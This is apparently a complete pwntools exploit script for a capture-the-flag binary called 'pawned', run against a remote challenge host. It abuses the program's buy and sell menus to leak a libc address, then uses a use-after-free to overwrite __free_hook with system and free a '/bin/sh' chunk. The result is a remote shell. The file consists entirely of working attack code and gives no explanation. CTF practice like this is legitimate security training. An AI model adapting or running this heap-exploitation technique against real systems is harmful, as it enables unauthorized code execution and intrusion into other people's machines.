from pwn import *

r = remote("challenge.ctf.games", 32545)
#r = process("./pawned")
#gdb.attach(r)




def buy(index):
	r.sendline(b'b')
	r.recvuntil(b'What item would you like to buy?:')
	#print(r.recvuntil(b'What item would you like to buy?:'))
	r.sendline(str(index).encode("utf-8"))
	r.recvuntil(b'>')

def sell(price, lenght, name):
	r.sendline(b's')
	r.recvuntil(b'Enter item price:')
	r.sendline(str(price).encode("utf-8"))
	r.recvuntil(b'Enter length of the item name:')
	r.sendline(str(lenght).encode("utf-8"))
	r.recvuntil(b'Enter the name of the item:')
	r.sendline(name)
	r.recvuntil(b'>')


def manager(index, lenght, name):
	r.sendline(b'm')
	r.recvuntil(b'What item would you like to change?:')
	r.sendline(str(index).encode("utf-8"))
	r.recvuntil(b'Enter the new item price:')
	r.send(b"\x00")
	r.recvuntil(b'Enter the new item name length:')
	r.sendline(str(lenght).encode("utf-8"))
	r.recvuntil(b'Enter the new name of the item:')
	r.sendline(name)
	r.recvuntil(b'>')


def printitem():
	r.sendline(b'p')
	stuff = r.recvuntil(b'>')
	return stuff

# leak libc base address
sell(100, 0x500, "11111111")
sell(200, 0x500, "22222222")
buy(1)
buy(2)

stuff = printitem().split(b'\n2.')[0][-6:]
libc_addr = int.from_bytes(stuff, "little")
malloc_hook_off = 0x00000000001ebb70
libc_base = libc_addr - 96 - 16 - malloc_hook_off

print("Libc_base address: " + hex(libc_base))

# old memory: 
#onegadget_off = 0xe6c81
#onegadget_addr = libc_base + onegadget_off
#target = libc_base + malloc_hook_off - 0x20 + 5 - 8
#payload = b"\x00"*3 + p64(0)*4 + p64(onegadget_addr)
#print(hex(onegadget_addr))

binsh_off = 0x1b75aa
binsh_addr = libc_base + binsh_off
system_off = 0x000000000055410
system_addr = libc_base + system_off
free_hook_off = 0x00000000001eeb28
free_hook_addr = libc_base + free_hook_off


# use after free
sell(100, 0x68, "123")
sell(200, 0x68, "123")
buy(3)
buy(4)
manager(4, 0x68, p64(free_hook_addr) )
sell(0x68, 0x68, b"/bin/sh\x00")
sell(300, 0x68, p64(system_addr))


# make a free() 
#buy(5)
r.sendline(b'b')
r.recvuntil(b'What item would you like to buy?:')
r.sendline(str(5).encode("utf-8"))
r.recv()


r.interactive()
